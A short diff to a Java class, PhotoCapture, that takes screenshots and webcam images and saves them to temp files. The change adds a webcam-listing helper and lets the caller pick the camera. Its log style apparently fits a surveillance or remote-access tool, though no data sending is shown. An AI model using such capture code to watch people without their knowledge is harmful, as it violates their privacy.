@@ -5,9 +5,14 @@ import java.awt.Rectangle;
 import java.awt.Toolkit;
 import java.awt.image.BufferedImage;
 import com.github.sarxos.webcam.Webcam;
+import java.util.List;
 
 
 public class PhotoCapture {
+	public static List<Webcam> findWebcams() {
+		return Webcam.getWebcams();
+	}
+
 	public static void takeScreenShot(Config conf) {
 		System.out.println("[*] Taking screenshot");
 		try {
@@ -19,10 +24,9 @@ public class PhotoCapture {
 		}
 	}
 
-	public static void takeCameraShot(Config conf) {
+	public static void takeCameraShot(Config conf, Webcam w) {
 		System.out.println("[*] Taking camera shot");
 		try {
-			Webcam w = Webcam.getDefault();
 			w.open();
 			BufferedImage camerashot = w.getImage();
 			ImageIO.write(camerashot, "PNG", new File(conf.tempcamera));
